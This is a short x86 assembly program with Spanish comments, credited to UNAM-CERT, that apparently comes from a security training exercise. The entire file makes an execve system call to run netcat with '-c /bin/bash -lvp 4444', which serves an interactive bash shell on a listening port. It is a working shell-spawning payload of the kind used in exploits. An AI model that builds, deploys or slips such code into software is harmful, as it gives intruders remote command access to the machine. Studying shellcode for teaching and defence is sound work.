;switch.asm
;UNAM-CERT
;Leal Gonzalez Ignacio

;Programa que llama a la llamada del sistema numero 11 que es excve para mandar una shell por medio de un puerto

section .text                                           ;Contiene las instrucciones a ejecutar
global _start                                           ;Linea requerida por ld
        
_start:                                                 ;Inicio del programa
    mov eax, 11                                         ;Numero de llamada del sistema
    mov ebx, arg0                                       ;Mandamos el comando
    mov ecx, argv                                       ;Los parametros
    mov edx, envp                                       ;Un entero
    int 0x80                                            ;Llamada al kernel

section .data                                           ;Segmento  que contiene las variables globales y estáticas inicializadas                                   
    arg0    db "/bin//nc",0                             ;Argumento para llamar al comando netcat
    arg1    db "127.0.0.1",0                            ;Direccion IP de localhost
    arg2    db "-c",0                                   ;Especificamos la shell
    arg3    db "/bin/bash",0                            ;Mandamos una shell 
    arg4    db "-lvp",0                                 ;Banderas para el modo de escucha, modo verboso y para especificar el puerto
    arg5    db "4444",0                                 ;Puerto donde mandaremos la shell

    argv    dd arg0, arg1, arg2, arg3, arg4, arg5, 0    ;Pasamos todos los argumentos
    envp    dd 0